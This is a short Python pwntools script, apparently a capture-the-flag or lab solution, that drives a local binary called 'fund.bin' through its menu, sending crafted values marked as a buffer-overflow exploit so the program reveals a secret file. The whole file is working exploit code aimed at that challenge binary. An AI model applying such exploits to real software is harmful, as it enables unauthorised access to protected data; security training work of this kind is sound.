#!/usr/bin/python3

from pwn import *


def exploit():
    # Write your exploit logic here.
    p = process("./fund.bin")

    # Exploit BOF
    for _ in range(4):
        print(p.recvline())
    print(p.recvuntil(b"(Enter 1~3): "))
    p.sendline(b"2")

    print(p.recvuntil(b"money from: "))
    p.sendline(b"22")
    print(p.recvuntil(b"more money: "))
    p.sendline(b"0")
    print(p.recvuntil(b"to move: "))
    p.sendline(b"1055")

    for _ in range(4):
        print(p.recvline())
    print(p.recvuntil(b"(Enter 1~3): "))
    p.sendline(b"3")

    # Reveal the secret file
    print(p.recvline())


if __name__ == "__main__":
    exploit()
